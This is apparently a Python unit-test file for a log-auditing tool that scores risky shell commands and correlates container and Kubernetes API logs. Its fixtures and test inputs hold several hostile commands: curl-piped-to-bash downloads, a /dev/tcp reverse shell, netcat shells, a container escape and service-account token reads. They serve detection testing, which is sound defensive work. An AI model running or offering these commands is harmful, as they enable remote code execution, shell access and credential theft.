"""Tests for ``audit.correlate`` (checkBox_65).

The handler is fed plain-text logs written to a temporary directory, so no
tshark or pcap is involved.  The fixtures are synthetic: one container-runtime
log holding a piped download-and-execute command and one API-server log that
records a successful request from a different entity IP in the same second.
"""
from __future__ import annotations

import csv
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from fnet.config import Config
from fnet.features import audit
from fnet.features.registry import FeatureContext
from fnet.logger import Logger
from fnet.utils import logfile

DOCKER_TEXT = "\n".join([
    "2024-12-02T14:14:30 container: exec, ContainerID: user1, "
    "Command: ls -l /home/user1, Docker IP:  172.17.0.10",
    "2024-12-02T14:14:31 container: exec, ContainerID: user2, "
    "Command: cat /etc/passwd, Docker IP:  172.17.0.11",
    "2024-12-02T14:14:35 container: exec, ContainerID: user9, "
    "Command: curl -s http://198.51.100.7/x.sh | base64 -d | bash, "
    "Docker IP:  172.17.0.3",
    "2024-12-02T14:20:00 container: exec, ContainerID: user3, "
    "Command: ps aux, Docker IP:  172.17.0.12",
])

KUBE_TEXT = "\n".join([
    "2024-12-02T14:14:20 Kube-API: Request to /api/v/pods, "
    "Pod IP: 10.1.2.3, Success: true",
    "2024-12-02T14:14:34 Kube-API: Request to /api/v1/pods, "
    "Pod IP: 10.1.2.4, Success: false, Error: Unauthorized",
    "2024-12-02T14:14:35 Kube-API: Request to /api/v/pods, "
    "Pod IP: 10.9.9.2, Success: true",
    "2024-12-02T14:14:36 Kube-API: Request to /api/v/pods, "
    "Pod IP: 10.1.2.5, Success: true",
    "2024-12-02T14:25:00 Kube-API: Request to /api/v/pods, "
    "Pod IP: 10.1.2.3, Success: true",
])

NOISY_TEXT = "\n".join([
    "2024-12-02T14:14:35 store: Client operation, ClientID: c1, "
    "Operation: Read, Key: Invalid key, Client IP: 192.0.2.50",
    "2024-12-02T14:14:36 store: Client operation, ClientID: c1, "
    "Operation: Read, Key: k1, Client IP: 192.0.2.51",
])


def make_ctx(tmp: str, path: str, params: dict | None = None) -> FeatureContext:
    logger = Logger(Path(tmp) / "test.log")
    return FeatureContext(
        config=Config(Path(tmp) / "config.ini"), logger=logger,
        tshark=None, pcap=path, params=dict(params or {}),
        output_dir=Path(tmp) / "out", findings=[], input_kind="log")


def log_text(ctx: FeatureContext) -> str:
    return "\n".join(record.line for record in ctx.logger.records_since(0))


class CommandRiskTest(unittest.TestCase):
    def test_download_and_pipe_execute_is_critical(self):
        score, labels = audit.command_risk(
            "curl -s http://198.51.100.7/x.sh | base64 -d | bash")
        self.assertEqual(score, 100)
        self.assertIn("管道直接执行 shell", labels)
        self.assertIn("base64 解码后执行", labels)

    def test_reverse_shell_is_detected(self):
        score, labels = audit.command_risk("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")
        self.assertGreaterEqual(score, 70)
        self.assertIn("bash 反弹 shell", labels)

    def test_container_escape_paths(self):
        for command in ("nsenter -t 1 -m -u -i -n -p -- sh",
                        "ls /var/run/docker.sock",
                        "cat /var/run/secrets/kubernetes.io/serviceaccount/token"):
            with self.subTest(command=command):
                score, _ = audit.command_risk(command)
                self.assertGreaterEqual(score, 50)

    def test_ordinary_commands_score_zero(self):
        for command in ("ls -l /home/user1", "cat /etc/passwd", "ps aux",
                        "df -h", "ip addr show", "netstat -anp"):
            with self.subTest(command=command):
                self.assertEqual(audit.command_risk(command), (0, []))

    def test_readonly_prefix_is_downgraded(self):
        # Raw score is 75 (35 + 40), i.e. well above the default threshold;
        # the read-only prefix must pull it below the threshold.
        command = "grep -r . /etc/cron.d && history -c"
        self.assertGreaterEqual(
            audit.command_risk("cd /tmp && " + command)[0],
            audit._DEFAULT_THRESHOLD)
        score, labels = audit.command_risk(command)
        self.assertIn("写入持久化任务", labels)
        self.assertIn("清理命令历史", labels)
        self.assertLess(score, audit._DEFAULT_THRESHOLD)
        # 阈值调低时，降级也跟着阈值走。
        self.assertLess(audit.command_risk(command, 30)[0], 30)

    def test_strong_feature_beats_readonly_prefix(self):
        # Reading kubelet credentials is read-only *and* a strong escape signal.
        score, _ = audit.command_risk(
            "cat /var/run/secrets/kubernetes.io/serviceaccount/token")
        self.assertGreaterEqual(score, audit._STRONG_WEIGHT)


class CommandExtractionTest(unittest.TestCase):
    def test_pipe_command_survives_kv_truncation(self):
        log = logfile.parse_text(DOCKER_TEXT, name="docker.log")
        record = [r for r in log.records if "base64" in r.raw][0]
        # The generic parser stops at the first pipe …
        self.assertNotIn("bash", record.value("command"))
        # … but the audit extractor restores the whole command and drops the
        # trailing `Docker IP: …` field.
        self.assertEqual(
            audit._command_of(record),
            "curl -s http://198.51.100.7/x.sh | base64 -d | bash")

    def test_command_lost_by_parser_is_recovered(self):
        record = logfile.parse_text(
            "2024-12-02T14:14:35 agent: Command: bash -i | nc 1.2.3.4 4444",
            name="agent.log").records[0]
        self.assertEqual(audit._command_of(record),
                         "bash -i | nc 1.2.3.4 4444")

    def test_csv_command_does_not_swallow_next_column(self):
        log = logfile.parse_text(
            "time,command,ip\n"
            "2024-12-02T14:14:35,curl -s http://198.51.100.7/x.sh | bash,10.0.0.5\n",
            name="a.csv")
        record = log.records[0]
        self.assertEqual(audit._command_of(record),
                         "curl -s http://198.51.100.7/x.sh | bash")

    def test_bracket_timestamp_does_not_hide_the_command(self):
        # ``[2024-…]`` 是常见的时间戳写法，不能被当成 JSON 而放弃补全命令。
        record = logfile.parse_text(
            "[2024-12-02T14:14:35] container: exec, "
            "Command: curl -s http://198.51.100.7/x | base64 -d | bash, "
            "Docker IP:  172.17.0.3", name="a.log").records[0]
        self.assertEqual(audit._command_of(record),
                         "curl -s http://198.51.100.7/x | base64 -d | bash")
        self.assertEqual(audit.command_risk(audit._command_of(record))[0], 100)

    def test_later_csv_column_pipe_is_not_swallowed(self):
        # 备注列里的 ``| bash`` 不属于命令列，也不能据此改写命令。
        log = logfile.parse_text(
            "time,command,client_ip,note\n"
            "2024-12-02T14:14:35,ls -l,172.17.0.3,upstream filter a | bash\n",
            name="a.csv")
        record = log.records[0]
        self.assertEqual(audit._command_of(record), "ls -l")
        # 命令没被污染，实体 IP 也还留在记录里。
        self.assertEqual(audit.entity_ip(record), ("client_ip", "172.17.0.3"))

    def test_pipe_inside_quotes_is_recovered(self):
        # 逗号在引号里把命令截成两半时，仍要还原完整命令。
        record = logfile.parse_text(
            '2024-12-02T14:14:35 agent: Command: echo "a, b" | bash',
            name="a.log").records[0]
        self.assertEqual(audit._command_of(record), 'echo "a, b" | bash')
        self.assertGreaterEqual(audit.command_risk(
            audit._command_of(record))[0], audit._DEFAULT_THRESHOLD)

    def test_awk_comma_is_not_a_field_boundary(self):
        # ``awk '{print $1, $2}'`` 里的逗号属于命令本身，不能截断。
        record = logfile.parse_text(
            "2024-12-02T14:14:35 container: exec, "
            "Command: awk '{print $1, $2}' /etc/passwd, "
            "Docker IP:  172.17.0.3", name="a.log").records[0]
        self.assertEqual(audit._command_of(record),
                         "awk '{print $1, $2}' /etc/passwd")
        self.assertEqual(audit.command_risk(audit._command_of(record)), (0, []))

    def test_jsonl_command_keeps_its_own_boundary(self):
        record = logfile.parse_text(
            '{"time":"2024-12-02T14:14:35","command":"curl -s '
            'http://198.51.100.7/x.sh | bash","ip":"10.0.0.5"}',
            name="a.jsonl").records[0]
        self.assertEqual(audit._command_of(record),
                         "curl -s http://198.51.100.7/x.sh | bash")

    def test_no_command_field_is_empty(self):
        record = logfile.parse_text(
            "2024-12-02T14:14:35 app: started worker",
            name="app.log").records[0]
        self.assertEqual(audit._command_of(record), "")

    def test_trailing_pipe_in_another_field_is_not_part_of_command(self):
        # 命令字段后面的 Output 里带管道，不能把 Output 拼进命令。
        for line, expected in (
            ("2024-12-02T14:14:35 container: exec, Command: ls -l, "
             "Output: a | bash", "ls -l"),
            ("2024-12-02T14:14:35 agent: Command: ls -l, "
             "Note: hello | nc 1.2.3.4 4444 -e sh", "ls -l"),
        ):
            with self.subTest(line=line):
                record = logfile.parse_text(line, name="a.log").records[0]
                self.assertEqual(audit._command_of(record), expected)
                self.assertEqual(audit.command_risk(expected), (0, []))

    def test_k8s_audit_jsonl_nested_fields_are_understood(self):
        record = logfile.parse_text(
            '{"kind":"Event","requestReceivedTimestamp":'
            '"2024-12-02T14:14:35.000000Z","verb":"create","requestURI":'
            '"/api/v1/namespaces/d/pods/x/exec","requestObject":{"command":'
            '["/bin/sh","-c","curl -s http://198.51.100.7/x | bash"]},'
            '"responseStatus":{"code":101},"sourceIPs":["10.1.2.3"]}',
            name="audit.jsonl").records[0]
        self.assertEqual(audit._command_of(record),
                         "/bin/sh -c curl -s http://198.51.100.7/x | bash")
        self.assertGreaterEqual(audit.command_risk(
            audit._command_of(record))[0], audit._DEFAULT_THRESHOLD)
        # 101 是 exec 的 websocket 正常升级，算成功。
        self.assertTrue(audit.success_state(record))
        self.assertEqual(audit.entity_ip(record)[1], "10.1.2.3")
        self.assertIsNotNone(audit._record_epoch(record))
        self.assertEqual(audit._record_time(record), "2024-12-02 14:14:35")


class EntityIpTest(unittest.TestCase):
    def test_specific_fields_win(self):
        record = logfile.parse_text(
            "2024-12-02T14:14:35 kube: pod_ip: 10.0.0.7, client_ip: 10.0.0.8",
            name="k.log").records[0]
        self.assertEqual(audit.entity_ip(record), ("pod_ip", "10.0.0.7"))

    def test_hex_looking_text_is_not_an_ip(self):
        record = logfile.parse_text(
            "2024-12-02T14:14:35 app: ip: dead, note: down",
            name="a.log").records[0]
        self.assertEqual(audit.entity_ip(record)[1], "")

    def test_falls_back_to_any_parsed_ip(self):
        record = logfile.parse_text(
            "2024-12-02T14:14:35 app: from 10.0.0.9 connected",
            name="a.log").records[0]
        self.assertEqual(audit.entity_ip(record), ("", "10.0.0.9"))

    def test_generic_field_does_not_beat_ip_address(self):
        # ``ip`` / ``backup_ip`` 都比 ``ip_address`` 泛，不能抢占。
        for line in (
            "2024-12-02T14:14:35 app: backup_ip: 10.9.9.9, "
            "ip_address: 10.0.0.5",
            "2024-12-02T14:14:35 app: ip: 10.9.9.9, ip_address: 10.0.0.5",
        ):
            with self.subTest(line=line):
                record = logfile.parse_text(line, name="a.log").records[0]
                self.assertEqual(audit.entity_ip(record),
                                 ("ip_address", "10.0.0.5"))

    def test_nested_entity_field_keeps_its_real_name(self):
        # 报告里应写真实字段名（``client.ip``），而不是笼统的 ``ip``。
        record = logfile.parse_text(
            '{"time":"2024-12-02T14:14:35","msg":"req",'
            '"client":{"ip":"10.5.5.5"}}', name="a.jsonl").records[0]
        self.assertEqual(audit.entity_ip(record), ("client.ip", "10.5.5.5"))

    def test_ipv6_address_in_command_is_excluded(self):
        record = logfile.parse_text(
            "2024-12-02T14:14:35 container: exec, "
            "Command: curl -s http://[2001:db8::7]/x | bash",
            name="a.log").records[0]
        command = audit._command_of(record)
        self.assertEqual(audit._ip_list(command), ("2001:db8::7",))
        self.assertEqual(audit.entity_ip(record, audit._ip_list(command)),
                         ("", ""))


class SuccessStateTest(unittest.TestCase):
    def test_boolean_words(self):
        log = logfile.parse_text(KUBE_TEXT, name="kube.log")
        states = [audit.success_state(record) for record in log.records]
        self.assertEqual(states, [True, False, True, True, True])

    def test_http_status_codes(self):
        ok = logfile.parse_text(
            "2024-12-02T14:14:35 web: status: 204, ip: 10.0.0.9",
            name="web.log").records[0]
        bad = logfile.parse_text(
            "2024-12-02T14:14:35 web: status: 503, ip: 10.0.0.9",
            name="web.log").records[0]
        self.assertTrue(audit.success_state(ok))
        self.assertIs(audit.success_state(bad), False)

    def test_unknown_when_no_signal(self):
        record = logfile.parse_text(
            "2024-12-02T14:14:35 app: started worker",
            name="app.log").records[0]
        self.assertIsNone(audit.success_state(record))

    def test_exit_code_is_not_an_http_status(self):
        # ``exit_code`` 曾被当成 ``code``：0 判成失败、1 判成成功，正好反了。
        for value in ("0", "1", "255"):
            with self.subTest(value=value):
                record = logfile.parse_text(
                    f"2024-12-02T14:14:35 app: exit_code: {value}, "
                    f"ip: 10.0.0.9", name="app.log").records[0]
                self.assertIsNone(audit.success_state(record))

    def test_short_numeric_code_is_not_an_http_status(self):
        # ``code: 0`` / ``code: 1`` 不是 HTTP 状态码，不能按 0/1 词表判成败。
        for value in ("0", "1"):
            with self.subTest(value=value):
                record = logfile.parse_text(
                    f"2024-12-02T14:14:35 app: code: {value}, "
                    f"ip: 10.0.0.9", name="app.log").records[0]
                self.assertIsNone(audit.success_state(record))

    def test_negated_success_field_is_not_success(self):
        # ``not_ok: true`` 不是 ``ok: true``。
        record = logfile.parse_text(
            "2024-12-02T14:14:35 app: not_ok: true, ip: 10.0.0.9",
            name="app.log").records[0]
        self.assertIsNone(audit.success_state(record))

    def test_nested_exit_code_is_not_an_http_status(self):
        # 嵌套字段 ``containerStatus.exitCode`` 同样不是 HTTP 状态码。
        record = logfile.parse_text(
            '{"time":"2024-12-02T14:14:35","msg":"pod stopped",'
            '"containerStatus":{"exitCode":0},"ip":"10.0.0.9"}',
            name="a.jsonl").records[0]
        self.assertIsNone(audit.success_state(record))

    def test_nested_negated_field_is_not_success(self):
        # 嵌套 JSON 里 ``notOk`` 同样不能当成 ``ok``。
        record = logfile.parse_text(
            '{"time":"2024-12-02T14:14:35","msg":"req",'
            '"status":{"notOk":true},"ip":"10.0.0.9"}',
            name="a.jsonl").records[0]
        self.assertIsNone(audit.success_state(record))

    def test_nested_status_field_is_still_read(self):
        # 真正的嵌套状态字段要能读到（``responseStatus.code``）。
        record = logfile.parse_text(
            '{"time":"2024-12-02T14:14:35","msg":"exec",'
            '"responseStatus":{"code":403},"sourceIPs":["10.0.0.9"]}',
            name="a.jsonl").records[0]
        self.assertIs(audit.success_state(record), False)
        self.assertEqual(audit.entity_ip(record), ("source_ips", "10.0.0.9"))

    def test_level_fallback(self):
        good = logfile.parse_text(
            '{"time":"2024-12-02T14:14:35","level":"good",'
            '"msg":"worker done","ip":"10.0.0.9"}', name="a.jsonl").records[0]
        bad = logfile.parse_text(
            '{"time":"2024-12-02T14:14:35","level":"error",'
            '"msg":"worker done","ip":"10.0.0.9"}', name="a.jsonl").records[0]
        self.assertTrue(audit.success_state(good))
        self.assertIs(audit.success_state(bad), False)

    def test_failure_keyword_fallback(self):
        # 级别是普通的 info，只能靠信息里的失败词判定。
        record = logfile.parse_text(
            "2024-12-02T14:14:35 app: connection refused by upstream, "
            "ip: 10.0.0.9", name="app.log").records[0]
        self.assertNotIn(record.level, ("warn", "error"))
        self.assertIs(audit.success_state(record), False)


class CorrelateTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        base = Path(self.tmp.name)
        self.docker = base / "docker.log"
        self.docker.write_text(DOCKER_TEXT, encoding="utf-8")
        self.kube = base / "kube-apiserver.log"
        self.kube.write_text(KUBE_TEXT, encoding="utf-8")
        self.noisy = base / "store.log"
        self.noisy.write_text(NOISY_TEXT, encoding="utf-8")

    def test_cross_source_correlation_emits_ip_pair(self):
        ctx = make_ctx(self.tmp.name, str(self.docker),
                       {"log_extra_paths": str(self.kube)})
        audit.correlate(ctx)
        text = log_text(ctx)
        self.assertIn("命中高危命令 1 条", text)
        self.assertIn("关联 IP 对", text)
        # Exec side comes from docker.log, matched side from kube-apiserver.log.
        self.assertIn("docker_ip | 172.17.0.3 | pod_ip | 10.9.9.2", text)

        pairs = [item for item in ctx.findings
                 if item["summary"].startswith("关联 IP 对")]
        # Two successful records fall inside the ±5 s window; both are
        # reported, rarest/most specific first.
        self.assertEqual([item["extra"]["match_ip"] for item in pairs],
                         ["10.9.9.2", "10.1.2.5"])
        self.assertTrue(all(item["extra"]["exec_ip"] == "172.17.0.3"
                            for item in pairs))

    def test_rarest_entity_wins_the_window(self):
        """Two successful records share the window; the rare IP ranks first."""
        kube = Path(self.tmp.name) / "rare.log"
        kube.write_text("\n".join([
            # 常见 IP：在窗口外反复出现。
            *[f"2024-12-02T14:0{minute}:00 Kube-API: Request to /api/v1/pods, "
              f"Pod IP: 10.1.2.7, Success: true" for minute in range(0, 6)],
            # 窗口内两条成功记录，稀有度不同。
            "2024-12-02T14:14:35 Kube-API: Request to /api/v1/pods, "
            "Pod IP: 10.1.2.7, Success: true",
            "2024-12-02T14:14:36 Kube-API: Request to /api/v1/pods, "
            "Pod IP: 10.9.9.2, Success: true",
        ]), encoding="utf-8")
        ctx = make_ctx(self.tmp.name, str(self.docker),
                       {"log_extra_paths": str(kube)})
        audit.correlate(ctx)
        rows = self.correlations()
        # 两条记录在同一份日志、同一窗口内，唯一区别是 IP 稀有度。
        self.assertEqual(len(rows), 2)
        self.assertEqual(rows[0]["关联实体 IP"], "pod_ip=10.9.9.2")
        self.assertEqual(rows[1]["关联实体 IP"], "pod_ip=10.1.2.7")
        self.assertLess(int(rows[0]["该 IP 出现次数"]),
                        int(rows[1]["该 IP 出现次数"]))

    def test_anchor_retries_other_logs_when_first_log_has_no_success(self):
        """主日志里 5 条高危 exec 事件不能挡住用另一份日志做锚点。"""
        exec_event = (
            '{{"kind":"Event","requestReceivedTimestamp":'
            '"2024-12-02T14:14:3{tenth}.000000Z","requestObject":'
            '{{"command":["/bin/sh","-c","curl -s http://198.51.100.7/x | bash"]}},'
            '"responseStatus":{{"code":101}},"sourceIPs":["10.1.2.{ip}"]}}')
        audit_log = Path(self.tmp.name) / "k8s-exec.jsonl"
        lines = [
            '{"kind":"Event","requestReceivedTimestamp":'
            '"2024-12-02T14:14:29.000000Z","requestURI":'
            '"/api/v1/namespaces/d/pods","responseStatus":{"code":201},'
            '"sourceIPs":["10.1.2.3"]}',
            *[exec_event.format(tenth=index, ip=10 + index)
              for index in range(5)],
        ]
        audit_log.write_text("\n".join(lines) + "\n", encoding="utf-8")
        docker = Path(self.tmp.name) / "docker-extra.log"
        docker.write_text(
            "2024-12-02T14:14:35 container: exec, ContainerID: user9, "
            "Command: curl -s http://198.51.100.7/x | bash, "
            "Docker IP:  172.17.0.3\n", encoding="utf-8")
        # 主输入是 k8s 审计（5 条高危 exec 记录 + 1 条普通成功），
        # docker 日志在附加路径里，且它本身没有 success 字段。
        ctx = make_ctx(self.tmp.name, str(audit_log),
                       {"log_extra_paths": str(docker)})
        audit.correlate(ctx)
        rows = self.correlations()
        self.assertTrue(rows)
        # 唯一可行的锚点是 docker 日志，关联侧是 k8s 的成功记录。
        self.assertEqual(rows[0]["执行侧位置"].split(":")[0], docker.name)
        self.assertEqual(rows[0]["关联实体 IP"], "source_ips=10.1.2.3")
        pairs = [item for item in ctx.findings
                 if item["summary"].startswith("关联 IP 对")]
        self.assertEqual(pairs[0]["extra"]["exec_ip"], "172.17.0.3")

    def test_cluster_gap_controls_clustering(self):
        gap_log = Path(self.tmp.name) / "gap.log"
        gap_log.write_text(
            "2024-12-02T14:14:35 container: exec, ContainerID: u1, "
            "Command: curl -s http://198.51.100.7/x | bash, "
            "Docker IP:  172.17.0.3\n"
            "2024-12-02T14:16:35 container: exec, ContainerID: u2, "
            "Command: curl -s http://198.51.100.8/x | bash, "
            "Docker IP:  172.17.0.4\n", encoding="utf-8")
        kube = Path(self.tmp.name) / "gap-kube.log"
        kube.write_text(
            "2024-12-02T14:14:35 Kube-API: Request to /api/v1/pods, "
            "Pod IP: 10.9.9.2, Success: true\n"
            "2024-12-02T14:16:35 Kube-API: Request to /api/v1/pods, "
            "Pod IP: 10.9.9.3, Success: true\n", encoding="utf-8")
        far = make_ctx(self.tmp.name, str(gap_log),
                       {"log_extra_paths": str(kube),
                        "log_cluster_gap": "60"})
        audit.correlate(far)
        self.assertEqual(log_text(far).count("关联命中"), 2)

        near = make_ctx(self.tmp.name, str(gap_log),
                        {"log_extra_paths": str(kube),
                         "log_cluster_gap": "300"})
        audit.correlate(near)
        self.assertEqual(log_text(near).count("关联命中"), 1)

    def test_cluster_cap_is_reported(self):
        spread = Path(self.tmp.name) / "spread.log"
        spread.write_text("\n".join(
            f"2024-12-02T14:00:{index:02d} container: exec, "
            f"ContainerID: u{index}, "
            f"Command: curl -s http://198.51.100.7/x | bash, "
            f"Docker IP:  172.17.3.{index}"
            for index in range(audit._MAX_CLUSTERS + 3)), encoding="utf-8")
        kube = Path(self.tmp.name) / "spread-kube.log"
        kube.write_text("\n".join(
            f"2024-12-02T14:00:{index:02d} Kube-API: Request to /api/v1/pods, "
            f"Pod IP: 10.8.8.{index}, Success: true"
            for index in range(audit._MAX_CLUSTERS + 3)), encoding="utf-8")
        ctx = make_ctx(self.tmp.name, str(spread),
                       {"log_extra_paths": str(kube), "log_cluster_gap": "0"})
        audit.correlate(ctx)
        text = log_text(ctx)
        self.assertIn(f"只对风险分最高的前 {audit._MAX_CLUSTERS} 个做跨源关联",
                      text)
        # 上限之外的活动簇不再做关联。
        self.assertEqual(text.count("关联命中"), audit._MAX_CLUSTERS)

    def test_candidate_cap_is_reported(self):
        busy = Path(self.tmp.name) / "busy-kube.log"
        busy.write_text("\n".join(
            f"2024-12-02T14:14:35 Kube-API: Request to /api/v1/pods, "
            f"Pod IP: 10.9.9.{index}, Success: true"
            for index in range(audit._MAX_CANDIDATES + 2)), encoding="utf-8")
        ctx = make_ctx(self.tmp.name, str(self.docker),
                       {"log_extra_paths": str(busy)})
        audit.correlate(ctx)
        self.assertIn(f"超过 {audit._MAX_CANDIDATES} 条成功记录", log_text(ctx))
        self.assertEqual(len(self.correlations()), audit._MAX_CANDIDATES)

    def test_truncated_log_is_reported(self):
        # 超过 MAX_RECORDS 的日志只解析了前一部分，必须提示，不能静默少分析。
        fake = logfile.LogFile(
            path=str(self.kube), format="kv",
            records=[logfile.LogRecord(line=1, raw="placeholder")],
            total_lines=10, truncated=True)
        ctx = make_ctx(self.tmp.name, str(self.kube))
        with mock.patch.object(audit.logfile, "parse_path", return_value=fake):
            logs = audit._load_many(ctx)
        self.assertEqual(len(logs), 1)
        self.assertIn("只分析了前 1 条记录", log_text(ctx))

    def test_pair_findings_cap_is_reported(self):
        pairs = audit._MAX_PAIR_FINDINGS + 2
        spread = Path(self.tmp.name) / "pair-spread.log"
        spread.write_text("\n".join(
            f"2024-12-02T{hour:02d}:00:00 container: exec, "
            f"ContainerID: u{index}, "
            f"Command: curl -s http://198.51.100.7/x | bash, "
            f"Docker IP:  172.17.4.{index}"
            for index, hour in enumerate(range(pairs))), encoding="utf-8")
        kube = Path(self.tmp.name) / "pair-kube.log"
        kube.write_text("\n".join(
            f"2024-12-02T{hour:02d}:00:00 Kube-API: Request to /api/v1/pods, "
            f"Pod IP: 10.9.9.{index}, Success: true"
            for index, hour in enumerate(range(pairs))), encoding="utf-8")
        ctx = make_ctx(self.tmp.name, str(spread),
                       {"log_extra_paths": str(kube), "log_cluster_gap": "0"})
        audit.correlate(ctx)
        self.assertIn(f"关联 IP 对 {pairs} 组只写入前 "
                      f"{audit._MAX_PAIR_FINDINGS} 组", log_text(ctx))
        self.assertEqual(len([item for item in ctx.findings
                              if item["summary"].startswith("关联 IP 对")]),
                         audit._MAX_PAIR_FINDINGS)

    def test_per_feature_finding_cap_is_reported(self):
        # job 配额充足，但本功能最多写 _MAX_FINDINGS 条：40 条高危命令 + 逐条
        # 关联 + IP 对已超过上限，必须说明是本功能的上限所致。
        many = Path(self.tmp.name) / "cap.log"
        many.write_text("\n".join(
            f"2024-12-02T14:14:{index % 60:02d} container: exec, "
            f"ContainerID: u{index}, "
            f"Command: curl -s http://198.51.100.7/x | bash, "
            f"Docker IP:  172.17.5.{index % 250}"
            for index in range(audit._MAX_RISKY)), encoding="utf-8")
        kube = Path(self.tmp.name) / "cap-kube.log"
        kube.write_text("\n".join(
            f"2024-12-02T14:14:{index % 60:02d} Kube-API: Request to "
            f"/api/v1/pods, Pod IP: 10.9.9.{index % 250}, Success: true"
            for index in range(audit._MAX_RISKY)), encoding="utf-8")
        ctx = make_ctx(self.tmp.name, str(many),
                       {"log_extra_paths": str(kube), "log_cluster_gap": "0"})
        audit.correlate(ctx)
        self.assertEqual(len(ctx.findings), audit._MAX_FINDINGS)
        self.assertIn(f"本功能上限 {audit._MAX_FINDINGS} 条", log_text(ctx))

    def test_pair_table_cap_is_reported(self):
        # 11 个活动簇 × 每簇 2 条成功记录 = 22 组关联对 > 表格上限 20。
        clusters = audit._MAX_PAIR_ROWS // 2 + 1
        spread = Path(self.tmp.name) / "rows.log"
        spread.write_text("\n".join(
            f"2024-12-02T{hour:02d}:00:00 container: exec, "
            f"ContainerID: u{index}, "
            f"Command: curl -s http://198.51.100.7/x | bash, "
            f"Docker IP:  172.17.6.{index}"
            for index, hour in enumerate(range(clusters))), encoding="utf-8")
        kube = Path(self.tmp.name) / "rows-kube.log"
        kube.write_text("\n".join(
            f"2024-12-02T{hour:02d}:00:00 Kube-API: Request to /api/v1/pods, "
            f"Pod IP: 10.7.{index}.{slot}, Success: true"
            for index, hour in enumerate(range(clusters)) for slot in (1, 2)),
            encoding="utf-8")
        ctx = make_ctx(self.tmp.name, str(spread),
                       {"log_extra_paths": str(kube), "log_cluster_gap": "0"})
        audit.correlate(ctx)
        pairs = clusters * 2
        # 表格只展示前 _MAX_PAIR_ROWS 组，其余交给 table() 的截断提示。
        self.assertIn(f"仅显示前 {audit._MAX_PAIR_ROWS} 条（共 {pairs} 条）",
                      log_text(ctx))
        # CSV 里保留全部关联对，表格只是展示截断。
        self.assertEqual(len(self.correlations()), pairs)

    def correlations(self) -> list[dict]:
        return list(csv.DictReader(
            (Path(self.tmp.name) / "out" / "audit_correlations.csv")
            .read_text(encoding="utf-8").splitlines()))

    def test_unauthorized_records_are_not_correlated(self):
        ctx = make_ctx(self.tmp.name, str(self.docker),
                       {"log_extra_paths": str(self.kube)})
        audit.correlate(ctx)
        rows = self.correlations()
        self.assertTrue(rows)
        self.assertFalse(any("Unauthorized" in row["关联记录"] for row in rows))
        # 失败的 10.1.2.4 只能来自失败记录，因此不应出现在关联结果里。
        self.assertFalse(any("10.1.2.4" in row["关联记录"] for row in rows))

    def test_noisy_log_does_not_win(self):
        ctx = make_ctx(self.tmp.name, str(self.docker),
                       {"log_extra_paths": f"{self.kube},{self.noisy}"})
        audit.correlate(ctx)
        rows = self.correlations()
        self.assertTrue(rows)
        # 噪声日志的记录带 "Invalid key"，既不是成功也不稀有，不应被关联。
        self.assertFalse(any("store.log" in row["关联侧位置"] for row in rows))
        self.assertFalse(any("192.0.2.50" in row["关联记录"] for row in rows))
        pairs = [item for item in ctx.findings
                 if item["summary"].startswith("关联 IP 对")]
        self.assertTrue(pairs)
        self.assertTrue(all(item["extra"]["match_ip"] != "192.0.2.50"
                            for item in pairs))

    def test_extra_paths_dedupe_and_missing_file_warns(self):
        ctx = make_ctx(self.tmp.name, str(self.docker), {
            "log_extra_paths":
                f"{self.kube};{self.kube}\n{Path(self.tmp.name) / 'nope.log'}",
        })
        audit.correlate(ctx)
        text = log_text(ctx)
        self.assertIn("参与关联的日志 2 份", text)
        self.assertIn("文件不存在，已跳过", text)

    def test_extra_paths_dedupe_after_resolving_spellings(self):
        # 同一份文件的不同写法（相对路径绕一圈）只能加载一次。
        base = Path(self.tmp.name)
        (base / "sub").mkdir(exist_ok=True)
        roundabout = base / "sub" / ".." / self.kube.name
        ctx = make_ctx(self.tmp.name, str(self.docker), {
            "log_extra_paths": f"{self.kube},{roundabout}",
        })
        self.assertEqual(audit._extra_paths(ctx), [str(self.kube.resolve())])
        audit.correlate(ctx)
        self.assertIn("参与关联的日志 2 份", log_text(ctx))
        rows = self.correlations()
        # 只加载一份 kube 日志，所以关联侧文件名只有一个（行号可以有多个）。
        self.assertEqual({row["关联侧位置"].split(":")[0] for row in rows},
                         {self.kube.name})

    def test_extra_paths_rejects_capture_files(self):
        pcap = Path(self.tmp.name) / "capture.pcap"
        pcap.write_bytes(b"\xd4\xc3\xb2\xa1\x02\x00\x04\x00" + b"\x00" * 64)
        ctx = make_ctx(self.tmp.name, str(self.docker),
                       {"log_extra_paths": f"{pcap},{self.kube}"})
        self.assertEqual(audit._extra_paths(ctx), [str(self.kube.resolve())])
        audit.correlate(ctx)
        self.assertIn("不是可解析的文本日志，已跳过", log_text(ctx))

    def test_extra_paths_rejects_directory(self):
        ctx = make_ctx(self.tmp.name, str(self.docker),
                       {"log_extra_paths": str(Path(self.tmp.name))})
        self.assertEqual(audit._extra_paths(ctx), [])
        self.assertIn("指向目录，已跳过", log_text(ctx))

    def test_extra_paths_cap_warns_only_when_truncating(self):
        base = Path(self.tmp.name)
        paths = []
        for index in range(audit._MAX_EXTRA_PATHS + 2):
            path = base / f"extra{index}.log"
            path.write_text(KUBE_TEXT, encoding="utf-8")
            paths.append(str(path))
        ctx = make_ctx(self.tmp.name, str(self.docker),
                       {"log_extra_paths": ",".join(paths)})
        self.assertEqual(len(audit._extra_paths(ctx)),
                         audit._MAX_EXTRA_PATHS)
        self.assertIn("其余 2 个已忽略", log_text(ctx))

    def test_extra_paths_at_cap_does_not_warn(self):
        base = Path(self.tmp.name)
        paths = []
        for index in range(audit._MAX_EXTRA_PATHS):
            path = base / f"exact{index}.log"
            path.write_text(KUBE_TEXT, encoding="utf-8")
            paths.append(str(path))
        ctx = make_ctx(self.tmp.name, str(self.docker),
                       {"log_extra_paths": ",".join(paths)})
        self.assertEqual(len(audit._extra_paths(ctx)),
                         audit._MAX_EXTRA_PATHS)
        self.assertNotIn("已忽略", log_text(ctx))

    def test_window_zero_still_matches_same_second(self):
        ctx = make_ctx(self.tmp.name, str(self.docker), {
            "log_extra_paths": str(self.kube),
            "log_correlate_window": "0",
        })
        audit.correlate(ctx)
        rows = self.correlations()
        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0]["关联实体 IP"], "pod_ip=10.9.9.2")
        self.assertIn("14:14:35", rows[0]["关联侧位置"] + rows[0]["时间"])
        pairs = [item for item in ctx.findings
                 if item["summary"].startswith("关联 IP 对")]
